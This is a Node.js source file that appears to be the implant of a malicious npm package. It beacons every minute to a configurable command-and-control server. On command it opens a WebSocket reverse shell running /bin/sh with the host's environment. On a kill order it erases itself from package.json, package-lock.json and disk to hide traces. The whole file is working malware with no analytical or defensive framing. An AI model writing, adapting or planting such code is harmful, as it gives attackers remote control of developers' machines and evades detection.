'use strict';
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const crypto = require('crypto');
const cp = require('child_process');

const C2_URL = process.env.DOLUS_C2 || '__C2_URL__';
const PKG_NAME = process.env.DOLUS_PKG || '__PKG_NAME__';
const BEACON_ID = process.env.DOLUS_BEACON_ID || '';
const BEACON_SECRET = process.env.DOLUS_SECRET || '__BEACON_SECRET__';

let shellActive = false;

function wsEncodeFrame(data) {
  const payload = Buffer.from(data);
  const len = payload.length;
  const mask = crypto.randomBytes(4);
  let header;
  if (len < 126) {
    header = Buffer.from([0x81, 0x80 | len, mask[0], mask[1], mask[2], mask[3]]);
  } else {
    header = Buffer.alloc(8);
    header[0] = 0x81; header[1] = 0x80 | 126;
    header.writeUInt16BE(len, 2);
    mask.copy(header, 4);
  }
  const masked = Buffer.alloc(len);
  for (let i = 0; i < len; i++) masked[i] = payload[i] ^ mask[i % 4];
  return Buffer.concat([header, masked]);
}

function connectShell() {
  try {
    const u = new URL(C2_URL);
    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: '/ws/shell/' + BEACON_ID + '/open',
      method: 'GET',
      headers: {
        'Connection': 'Upgrade',
        'Upgrade': 'websocket',
        'Sec-WebSocket-Key': crypto.randomBytes(16).toString('base64'),
        'Sec-WebSocket-Version': '13',
        'x-beacon-secret': BEACON_SECRET,
      },
    });

    req.on('upgrade', (_res, socket) => {
      const shell = cp.spawn('/bin/sh', [], {
        stdio: ['pipe', 'pipe', 'pipe'],
        env: process.env,
      });

      function sendOut(data) {
        try { socket.write(wsEncodeFrame(data.toString('utf8'))); } catch (_) {}
      }
      shell.stdout.on('data', sendOut);
      shell.stderr.on('data', sendOut);
      shell.on('close', () => { shellActive = false; try { socket.destroy(); } catch (_) {} });
      shell.on('error', () => { shellActive = false; });

      let buf = Buffer.alloc(0);
      socket.on('data', chunk => {
        buf = Buffer.concat([buf, chunk]);
        while (buf.length >= 2) {
          let len = buf[1] & 0x7f;
          let off = 2;
          if (len === 126) { if (buf.length < 4) break; len = buf.readUInt16BE(2); off = 4; }
          if (buf.length < off + len) break;
          const frame = buf.slice(off, off + len);
          buf = buf.slice(off + len);
          const cmd = frame.toString('utf8');
          if (cmd.trim()) shell.stdin.write(cmd.endsWith('\n') ? cmd : cmd + '\n');
        }
      });
      socket.on('close', () => { shellActive = false; try { shell.kill(); } catch (_) {} });
      socket.on('error', () => { shellActive = false; try { shell.kill(); } catch (_) {} });
    });
    req.on('error', () => { shellActive = false; });
    req.end();
  } catch (_) { shellActive = false; }
}

function ping() {
  const body = JSON.stringify({ beacon_id: BEACON_ID, pkg: PKG_NAME, beacon_secret: BEACON_SECRET });
  try {
    const url = new URL(C2_URL + '/api/heartbeat');
    const mod = url.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, res => {
      let data = '';
      res.on('data', d => { data += d; });
      res.on('end', () => {
        try {
          const resp = JSON.parse(data);
          if (resp.shell && !shellActive) {
            shellActive = true;
            connectShell();
          }
          if (resp.kill) {
            try {
              const root = path.join(__dirname, '..', '..');
              // Remove from package.json
              try {
                const pkgPath = path.join(root, 'package.json');
                const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
                if (pkg.dependencies) delete pkg.dependencies[PKG_NAME];
                if (pkg.devDependencies) delete pkg.devDependencies[PKG_NAME];
                fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 2) + '\n');
              } catch (_) {}
              // Remove from package-lock.json
              try {
                const lockPath = path.join(root, 'package-lock.json');
                const lock = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
                if (lock.packages) {
                  delete lock.packages['node_modules/' + PKG_NAME];
                  if (lock.packages[''] && lock.packages[''].dependencies)
                    delete lock.packages[''].dependencies[PKG_NAME];
                }
                if (lock.dependencies) delete lock.dependencies[PKG_NAME];
                fs.writeFileSync(lockPath, JSON.stringify(lock, null, 2) + '\n');
              } catch (_) {}
              // Delete package directory
              fs.rmSync(__dirname, { recursive: true, force: true });
            } catch (_) {}
            process.exit(0);
          }
        } catch (_) {}
      });
    });
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch (_) {}
}

ping();
setInterval(ping, 60_000);
